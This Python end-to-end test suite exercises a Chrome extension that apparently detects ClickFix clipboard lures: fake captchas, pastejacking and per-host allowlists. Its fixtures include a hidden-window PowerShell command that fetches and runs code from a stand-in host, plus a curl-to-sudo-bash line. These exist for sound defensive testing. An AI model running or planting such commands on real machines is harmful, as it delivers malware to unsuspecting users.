#!/usr/bin/env python3
"""End-to-end tests: the real, unpacked extension in Chrome for Testing.

    python3 tests/e2e.py            # run everything
    python3 tests/e2e.py -k hosts   # only checks whose name contains "hosts"

Standard library only. Branded Chrome no longer accepts --load-extension, so
this downloads Chrome for Testing once into ~/.cache/clickfix-guard/ and drives
it over the DevTools protocol (--remote-debugging-pipe).

Every hostname resolves to a local HTTPS server (self-signed, certificate
errors ignored), so the real allowlist rules run against real-looking hosts
(code.claude.com, sites.google.com, ...) without touching the network.
"""
import http.server, json, os, shutil, ssl, subprocess, sys, tempfile, threading, time

REPO = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CACHE = os.path.expanduser("~/.cache/clickfix-guard")
CFT_BIN = CACHE + "/cft/chrome-mac-arm64/Google Chrome for Testing.app/Contents/MacOS/Google Chrome for Testing"
ONLY = sys.argv[sys.argv.index("-k") + 1] if "-k" in sys.argv else ""
PORT, HOOK_PORT = 8443, 8766
COMMAND = "powershell -w hidden -c iex(irm http://x.invalid)"
BLOB = "QWxhZGRpbjpvcGVuIHNlc2FtZSBhbmQgc29tZSBtb3JlIGJ5dGVzIDEyMzQ1Njc4OTA="


def ensure_cft():
    if os.path.exists(CFT_BIN):
        return
    print("downloading Chrome for Testing …", file=sys.stderr)
    os.makedirs(CACHE, exist_ok=True)
    # curl rather than urllib: the system python3 on macOS has no CA bundle of its own
    meta = json.loads(subprocess.run(["curl", "-fsSL", "https://googlechromelabs.github.io/chrome-for-testing/last-known-good-versions-with-downloads.json"],
                                     check=True, capture_output=True).stdout)
    url = [d["url"] for d in meta["channels"]["Stable"]["downloads"]["chrome"] if d["platform"] == "mac-arm64"][0]
    z = CACHE + "/cft.zip"
    subprocess.run(["curl", "-fsSL", "-o", z, url], check=True)
    subprocess.run(["unzip", "-q", "-o", z, "-d", CACHE + "/cft"], check=True)  # unzip keeps the exec bits / symlinks
    os.remove(z)


# ---- pages -----------------------------------------------------------------------
def page(body):
    return ("<!doctype html><meta charset=utf-8><title>t</title><body>" + body + "</body>").encode()


PAGES = {
    "/benign": page("<button id=b>Copy</button><script>b.onclick=()=>navigator.clipboard.writeText("
                    "'This process usually takes several minutes and runs quietly in the background while the system finishes preparing your document').catch(()=>{})</script>"),
    "/swagger": page("<div id=swagger-ui><pre id=c>curl -X 'GET' 'https://api.example.com/v1/offers' -H 'accept: application/json'</pre><button id=copy>Copy</button></div>"
                     "<script>copy.onclick=()=>{const t=document.createElement('textarea');t.value=c.textContent;document.body.appendChild(t);t.select();document.execCommand('copy');t.remove()}</script>"),
    # an app with its own copy handling, like Notion/Jira: writes the user's selection (re-formatted) itself
    "/richapp": page("<div id=doc><p>Deploy notes</p><p>run: curl -s https://get.example.com/install.sh | sudo bash -c 'cat'</p><p>then restart the service</p></div><p id=code>VERIFY-4821</p>"
                     "<script>const mode=new URLSearchParams(location.search).get('m');document.addEventListener('copy',e=>{const s=String(getSelection());"
                     "e.clipboardData.setData('text/plain', mode==='jack' ? %s : s.split('\\n').filter(Boolean).map(l=>'- '+l).join('\\n'));"
                     "e.clipboardData.setData('text/html','<ul><li>x</li></ul>');e.preventDefault()});"
                     "window.scriptedCopy=()=>document.execCommand('copy')</script>" % json.dumps(COMMAND)),
    "/token": page("<p>API key</p><button id=b>Copy token</button><script>b.onclick=()=>navigator.clipboard.writeText(%s).catch(()=>{})</script>" % json.dumps(BLOB)),
    "/captcha-blob": page("<label id=chk class=captcha><input type=checkbox id=human> I'm not a robot</label>"
                          "<script>human.onclick=()=>navigator.clipboard.writeText(%s).catch(()=>{})</script>" % json.dumps(BLOB)),
    # an editor that lives in an about:blank iframe (TinyMCE-style)
    "/blankframe": page("<p>editor host page</p><script>const f=document.createElement('iframe');document.body.appendChild(f);"
                        "window.frameCopy=()=>f.contentWindow.eval(%s)</script>" % json.dumps("navigator.clipboard.writeText(%s).catch(()=>{})" % json.dumps(COMMAND))),
    "/clip": page("<p id=t>some selectable text</p><textarea id=ta>ta text</textarea>"),
}
hooks = []


class Pages(http.server.SimpleHTTPRequestHandler):
    def __init__(self, *a, **k):
        super().__init__(*a, directory=os.path.join(REPO, "test-pages"), **k)

    def do_GET(self):
        body = PAGES.get(self.path.split("?")[0])
        if body is None:
            return super().do_GET()
        self.send_response(200)
        self.send_header("Content-Type", "text/html; charset=utf-8")
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)

    def log_message(self, *a):
        pass


class Hook(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        hooks.append(json.loads(self.rfile.read(int(self.headers.get("Content-Length", 0)))))
        self.send_response(200)
        self.end_headers()

    def log_message(self, *a):
        pass


# ---- browser ------------------------------------------------------------------------
class Browser:
    def __init__(self, tmp):
        cert, key = tmp + "/c.pem", tmp + "/k.pem"
        subprocess.run(["openssl", "req", "-x509", "-newkey", "rsa:2048", "-nodes", "-keyout", key, "-out", cert, "-days", "2", "-subj", "/CN=clickfix-e2e"],
                       check=True, capture_output=True)
        srv = http.server.ThreadingHTTPServer(("127.0.0.1", PORT), Pages)
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain(cert, key)
        srv.socket = ctx.wrap_socket(srv.socket, server_side=True)
        threading.Thread(target=srv.serve_forever, daemon=True).start()
        threading.Thread(target=http.server.ThreadingHTTPServer(("127.0.0.1", HOOK_PORT), Hook).serve_forever, daemon=True).start()

        ext = tmp + "/ext"  # a copy without .git, like the packed extension
        shutil.copytree(REPO, ext, ignore=shutil.ignore_patterns(".git", "tests", "__pycache__"))
        to_r, self.w = os.pipe()
        self.r, from_w = os.pipe()
        self.proc = subprocess.Popen(
            [CFT_BIN, "--headless=new", "--no-first-run", "--remote-debugging-pipe", "--user-data-dir=" + tmp + "/profile",
             "--load-extension=" + ext, "--disable-extensions-except=" + ext,
             "--host-resolver-rules=MAP * 127.0.0.1", "--ignore-certificate-errors", "about:blank"],
            preexec_fn=lambda: (os.dup2(to_r, 3), os.dup2(from_w, 4)), close_fds=False, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        os.close(to_r)
        os.close(from_w)
        self.buf, self.n, self.dialogs = b"", 0, []

        def find():
            for t in self.call("Target.getTargets")["targetInfos"]:
                if t["type"] == "service_worker" and t["url"].endswith("/src/background/service-worker.js"):
                    return t
        t = wait(find, 15)
        assert t, "extension service worker did not start — manifest or schema error?"
        self.ext_id = t["url"].split("/")[2]
        self.sw = self.call("Target.attachToTarget", {"targetId": t["targetId"], "flatten": True})["sessionId"]
        self.call("Runtime.enable", {}, self.sw)
        self.call("Runtime.runIfWaitingForDebugger", {}, self.sw)
        wait(lambda: self.ev(self.sw, "typeof chrome === 'object' && chrome.storage.local.get('policy').then(v => !!v.policy)"))
        self.ev(self.sw, "chrome.storage.local.set({ webhookUrl: 'http://127.0.0.1:%d/hook' })" % HOOK_PORT)

    def call(self, method, params=None, session=None):
        self.n += 1
        mid = self.n
        m = {"id": mid, "method": method, "params": params or {}}
        if session:
            m["sessionId"] = session
        os.write(self.w, json.dumps(m).encode() + b"\0")
        while True:
            while b"\0" not in self.buf:
                chunk = os.read(self.r, 1 << 16)
                if not chunk:
                    raise RuntimeError("chrome exited")
                self.buf += chunk
            raw, self.buf = self.buf.split(b"\0", 1)
            msg = json.loads(raw)
            if msg.get("method") == "Page.javascriptDialogOpening":  # the trust button's confirm()
                self.dialogs.append(msg["params"]["message"])
                self.n += 1
                os.write(self.w, json.dumps({"id": self.n, "method": "Page.handleJavaScriptDialog", "params": {"accept": True},
                                             "sessionId": msg["sessionId"]}).encode() + b"\0")
            if msg.get("id") == mid:
                if "error" in msg:
                    raise RuntimeError(method + ": " + json.dumps(msg["error"]))
                return msg["result"]

    def ev(self, session, expr):
        # a page promise that never settles (e.g. a clipboard call waiting on a prompt) must not hang the run
        expr = "Promise.race([Promise.resolve().then(() => (%s)), new Promise(r => setTimeout(() => r('TIMEOUT'), 4000))])" % expr
        r = self.call("Runtime.evaluate", {"expression": expr, "returnByValue": True, "awaitPromise": True, "userGesture": True}, session)
        if "exceptionDetails" in r:
            return "EXCEPTION: " + (r["exceptionDetails"].get("exception", {}).get("description") or "")[:200]
        return r["result"].get("value")

    def open(self, url):
        tid = self.call("Target.createTarget", {"url": "about:blank"})["targetId"]
        s = self.call("Target.attachToTarget", {"targetId": tid, "flatten": True})["sessionId"]
        self.call("Page.enable", {}, s)
        self.call("Emulation.setFocusEmulationEnabled", {"enabled": True}, s)
        self.call("Page.navigate", {"url": url}, s)
        wait(lambda: self.ev(s, "document.readyState === 'complete' && location.protocol !== 'about:'") is True)
        time.sleep(0.4)
        return tid, s

    def close(self, tid):
        self.call("Target.closeTarget", {"targetId": tid})

    def user_copy(self, s):
        """A real Ctrl/Cmd+C: Chrome runs its 'copy' editing command, so the copy event is trusted."""
        self.call("Input.dispatchKeyEvent", {"type": "rawKeyDown", "key": "c", "code": "KeyC", "windowsVirtualKeyCode": 67, "modifiers": 4, "commands": ["copy"]}, s)
        self.call("Input.dispatchKeyEvent", {"type": "keyUp", "key": "c", "code": "KeyC", "windowsVirtualKeyCode": 67, "modifiers": 4}, s)

    def banner(self, s):
        return self.ev(s, "[...document.documentElement.children].some(e => (e.getAttribute('style') || '').includes('2147483647'))") is True

    def trust_button(self, s):
        def walk(n):
            if n.get("nodeName") == "BUTTON" and "trust" in (n.get("attributes") or []):
                return n["backendNodeId"]
            for c in (n.get("children") or []) + (n.get("shadowRoots") or []):
                r = walk(c)
                if r:
                    return r
        return walk(self.call("DOM.getDocument", {"depth": -1, "pierce": True}, s)["root"])

    def visit(self, url, action=None, settle=1.2, copy=False):
        tid, s = self.open(url)
        if action:
            r = self.ev(s, action)
            assert not str(r).startswith("EXCEPTION"), "test action failed: %s -> %s" % (action[:80], r)
        if copy:
            time.sleep(0.2)
            self.user_copy(s)
        time.sleep(settle)
        out = self.banner(s)
        self.close(tid)
        return out

    def set_policy(self, managed):
        self.ev(self.sw, "chrome.storage.local.set({ policy: POLICY.policyFromManaged(%s), userAllowlist: [] })" % json.dumps(managed))

    def log(self):
        return self.ev(self.sw, "chrome.storage.local.get({log: []}).then(v => v.log.map(e => e.url + ' | ' + e.score + ' | ' + e.indicators.join(',')))")

    def quit(self):
        self.proc.kill()
        self.proc.wait()


def wait(fn, timeout=10):
    end = time.time() + timeout
    while time.time() < end:
        v = fn()
        if v:
            return v
        time.sleep(0.2)


results = []


def check(name, got, want=True):
    ok = got == want
    results.append(ok)
    print(("  ok    " if ok else "  FAIL  ") + name + ("" if ok else "   got %r, want %r" % (got, want)))


def group(name):
    if ONLY and ONLY not in name:
        return False
    print(name)
    return True


def url(host, path):
    return "https://%s:%d%s" % (host, PORT, path)


LEVEL2, CLICK2 = "/level2-fake-captcha-clipboard.html", "document.getElementById('verify').click()"
SELECT = "(() => { const r = document.createRange(); r.selectNodeContents(document.getElementById(%s)); const s = getSelection(); s.removeAllRanges(); s.addRange(r); })()"


def run(b):
    lure = "lure.example.test"

    if group("detection: the test-pages levels"):
        check("level 1 (text only)", b.visit(url(lure, "/level1-basic.html")))
        check("level 2 (fake captcha + writeText)", b.visit(url(lure, LEVEL2), CLICK2))
        check("level 3 (unicode evasion, delayed)", b.visit(url(lure, "/level3-evasion-macos.html"), settle=4.5))
        check("level 5 (keywordless, after verify click)", b.visit(url(lure, "/level5-keywordless-behavioral.html"), "document.getElementById('human-chk').click()"))
        check("level 6A (prototype call)", b.visit(url(lure, "/level6-hook-bypass.html?a"), "document.getElementById('proto').click()"))
        check("level 6B (pastejacking, page-dispatched copy)", b.visit(url(lure, "/level6-hook-bypass.html?b"),
              "[document.getElementById('code').click(), document.dispatchEvent(new ClipboardEvent('copy', {clipboardData: new DataTransfer()}))]"))
        check("plain prose copied by a button → no banner", b.visit(url(lure, "/benign"), "b.click()"), False)

    if group("own selection vs pastejacking (apps with their own copy handler)"):
        check("user copies their own selection containing a curl|bash line → no banner",
              b.visit(url("notes.example.test", "/richapp?m=own"), SELECT % "'doc'", copy=True), False)
        check("page swaps the user's copy for a command → banner",
              b.visit(url("notes.example.test", "/richapp?m=jack"), SELECT % "'code'", copy=True))
        check("same swap when nothing is selected → banner", b.visit(url("notes.example.test", "/richapp?m=jack"), copy=True))
        check("scripted execCommand('copy') over a selection is not vouched for → banner",
              b.visit(url("notes.example.test", "/richapp?m=own"), "[" + (SELECT % "'doc'") + ", scriptedCopy()]"))

    if group("opaque blob: supporting evidence only"):
        check("'copy token' button writes a base64 blob → no banner", b.visit(url("console.example.test", "/token"), "b.click()"), False)
        check("the same blob right after a fake-captcha click → banner", b.visit(url(lure, "/captcha-blob"), "human.click()"))

    if group("hosts: built-in allowlist and neverAllowlist"):
        for host in ("code.claude.com", "claude.ai", "chatgpt.com", "gemini.google.com", "translate.google.com", "docs.google.com",
                     "chat.google.com", "www.google.com", "app.notion.com", "brew.sh"):
            check(host + " → silent", b.visit(url(host, LEVEL2), CLICK2), False)
        for host in ("sites.google.com", "lure.pages.dev", "abc.claudeusercontent.com", "evil.github.io", "accounts.google.com"):
            tid, s = b.open(url(host, LEVEL2))
            b.ev(s, CLICK2)
            time.sleep(1.2)
            check(host + " → banner", b.banner(s))
            if host != "accounts.google.com":
                check(host + " → no 'Trust this site' button", b.trust_button(s) is None)
            b.close(tid)

    if group("about:blank frames take their creator's host"):
        check("editor frame on an allowlisted host → silent", b.visit(url("docs.google.com", "/blankframe"), "frameCopy()"), False)
        before = set(b.log())
        check("editor frame elsewhere → banner", b.visit(url("editor.example.test", "/blankframe"), "frameCopy()"))
        new = [e for e in b.log() if e not in before]
        check("  …and the frame's own detection is reported under that host", any("editor.example.test" in e and "about:blank" in e for e in new))

    if group("managed policy (as the Admin console would set it)"):
        b.set_policy({"allowlist": ["hepsiburada.com", "localhost", "google.com", "sites.google.com", "com", 42],
                      "neverAllowlist": ["www.hepsiburada.com"], "removeFromBuiltin": ["claude.com", "nope.example.com"]})
        ignored = b.ev(b.sw, "chrome.storage.local.get('policy').then(v => v.policy.ignored.join(' ; '))")
        check("popup would list: single-label, non-string, shadowed and unknown-removal entries",
              all(x in ignored for x in ('"com"', "42", "sites.google.com", "nope.example.com")))
        check("jira.hepsiburada.com (admin apex) → silent", b.visit(url("jira.hepsiburada.com", "/swagger"), "copy.click()"), False)
        check("www.hepsiburada.com (admin never) → banner", b.visit(url("www.hepsiburada.com", LEVEL2), CLICK2))
        check("localhost (admin) → silent", b.visit(url("localhost", "/swagger"), "copy.click()"), False)
        check("docs.google.com (built-in kept next to a short admin list) → silent", b.visit(url("docs.google.com", LEVEL2), CLICK2), False)
        check("sites.google.com (never wins over admin google.com) → banner", b.visit(url("sites.google.com", LEVEL2), CLICK2))
        check("code.claude.com (removed from built-in) → banner", b.visit(url("code.claude.com", LEVEL2), CLICK2))
        check("swagger on an unlisted host → banner", b.visit(url("api.other-company.example", "/swagger"), "copy.click()"))
        b.set_policy({})

    if group("trust button, popup, webhook"):
        hooks.clear()
        tid, s = b.open(url("trustme.example.test", LEVEL2))
        b.ev(s, CLICK2)
        time.sleep(1)
        q = b.call("DOM.getBoxModel", {"backendNodeId": b.trust_button(s)}, s)["model"]["content"]
        for typ in ("mousePressed", "mouseReleased"):
            b.call("Input.dispatchMouseEvent", {"type": typ, "x": (q[0] + q[2]) / 2, "y": (q[1] + q[5]) / 2, "button": "left", "clickCount": 1}, s)
        time.sleep(1)
        b.close(tid)
        check("real click → confirm() names the host", bool(b.dialogs) and "trustme.example.test" in b.dialogs[-1])
        check("…host stored", b.ev(b.sw, "chrome.storage.local.get({userAllowlist: []}).then(v => v.userAllowlist.join())"), "trustme.example.test")
        check("…and silent afterwards", b.visit(url("trustme.example.test", LEVEL2), CLICK2), False)
        tid, s = b.open("chrome-extension://%s/src/popup/popup.html" % b.ext_id)
        time.sleep(0.5)
        check("popup lists detections and the trusted site", b.ev(s, "document.querySelectorAll('#list .entry').length > 0 && document.querySelectorAll('#allowlist-list .entry').length === 1"))
        b.close(tid)
        time.sleep(0.5)
        check("webhook payload fields", sorted(hooks[0].keys()) if hooks else None,
              ["chromeVersion", "extensionVersion", "indicators", "installId", "platform", "score", "tabId", "time", "url"])
        msg = b.ev(b.sw, "slackMessage({ url: 'https://lure.example.com/v?a=<b>', score: 8, indicators: ['x'], time: Date.now(), installId: '1a2b3c4d-0', "
                         "platform: 'macOS', chromeVersion: '1', extensionVersion: '1', user: 'a@example.com' }).blocks[0].text.text")
        check("slack message: defanged, escaped, labelled", all(x in msg for x in ("hxxps://lure[.]example[.]com", "&lt;b&gt;", "*Score:* 8", "*User:* a@example.com", "ID 1a2b3c4d")))
        msg = b.ev(b.sw, "(() => { const real = chrome.i18n.getMessage; chrome.i18n.getMessage = () => ''; try { return slackMessage({ url: 'https://x.example.com/', score: 5, "
                         "indicators: [], time: 0, installId: 'abcdefgh' }).blocks[0].text.text } finally { chrome.i18n.getMessage = real } })()")
        check("slack labels survive chrome.i18n returning ''", all(x in msg for x in ("ClickFix Guard detection", "*Page:*", "*Score:*", "*Browser:*")))

    if group("copying still works through the hooks"):
        b.call("Browser.grantPermissions", {"permissions": ["clipboardReadWrite", "clipboardSanitizedWrite"], "origin": url("clip.example.test", "")})
        tid, s = b.open(url("clip.example.test", "/clip"))
        check("hooks are installed on this page", b.ev(s, "/native code/.test(Clipboard.prototype.writeText.toString())"), False)
        blob = lambda text, typ: "new Blob([%s], {type: %s})" % (json.dumps(text), json.dumps(typ))
        read = "(async () => { const o = {}; for (const it of await navigator.clipboard.read()) for (const t of it.types) o[t] = (await (await it.getType(t)).text()).slice(0, 40); return o })()"
        cases = [
            ("writeText", "navigator.clipboard.writeText('A')", {"text/plain": "A"}),
            ("write: plain + html", "navigator.clipboard.write([new ClipboardItem({'text/plain': %s, 'text/html': %s})])" % (blob("B", "text/plain"), blob("<b>B</b>", "text/html")), {"text/plain": "B", "text/html": "<b>B</b>"}),
            ("write: promise-valued item", "navigator.clipboard.write([new ClipboardItem({'text/plain': Promise.resolve(%s), 'text/html': new Promise(r => setTimeout(() => r(%s), 150))})])" % (blob("C", "text/plain"), blob("<i>C</i>", "text/html")), {"text/plain": "C", "text/html": "<i>C</i>"}),
            ("write: string-valued item", "navigator.clipboard.write([new ClipboardItem({'text/plain': 'D'})])", {"text/plain": "D"}),
            ("write: html only", "navigator.clipboard.write([new ClipboardItem({'text/html': %s})])" % blob("<u>E</u>", "text/html"), {"text/html": "<u>E</u>"}),
            ("write: web custom format", "navigator.clipboard.write([new ClipboardItem({'text/plain': %s, 'web application/x-test': %s})])" % (blob("F", "text/plain"), blob("custom", "application/x-test")), {"text/plain": "F", "web application/x-test": "custom"}),
            ("write: a Set instead of an array", "navigator.clipboard.write(new Set([new ClipboardItem({'text/plain': %s})]))" % blob("G", "text/plain"), {"text/plain": "G"}),
            ("copy event: setData plain + html", "(() => { document.addEventListener('copy', e => { e.clipboardData.setData('text/plain', 'H'); e.clipboardData.setData('text/html', '<b>H</b>'); e.preventDefault() }, {once: true}); return document.execCommand('copy') })()", {"text/plain": "H", "text/html": "<b>H</b>"}),
            ("copy event: items.add", "(() => { document.addEventListener('copy', e => { e.clipboardData.items.add('I', 'text/plain'); e.preventDefault() }, {once: true}); return document.execCommand('copy') })()", {"text/plain": "I"}),
            ("execCommand copy from a textarea", "(() => { ta.focus(); ta.select(); return document.execCommand('copy') })()", {"text/plain": "ta text"}),
        ]
        for name, expr, want in cases:
            b.ev(s, "navigator.clipboard.writeText('__reset__')")
            b.ev(s, "(async () => { try { await (%s) } catch (e) { return 'REJECTED ' + e } })()" % expr)
            time.sleep(0.15)
            check(name, b.ev(s, read), want)
        b.ev(s, (SELECT % "'t'"))
        b.ev(s, "navigator.clipboard.writeText('__reset__')")
        b.user_copy(s)
        time.sleep(0.3)
        check("real Cmd+C of a selection", (b.ev(s, read) or {}).get("text/plain"), "some selectable text")
        b.close(tid)


if __name__ == "__main__":
    ensure_cft()
    tmp = tempfile.mkdtemp(prefix="clickfix-e2e.")
    b = Browser(tmp)
    try:
        print("extension", b.ev(b.sw, "chrome.runtime.getManifest().version"), "in", subprocess.run([CFT_BIN, "--version"], capture_output=True, text=True).stdout.strip())
        run(b)
    finally:
        b.quit()
        shutil.rmtree(tmp, ignore_errors=True)
    print("\n%d checks, %d failed" % (len(results), results.count(False)))
    sys.exit(1 if False in results else 0)
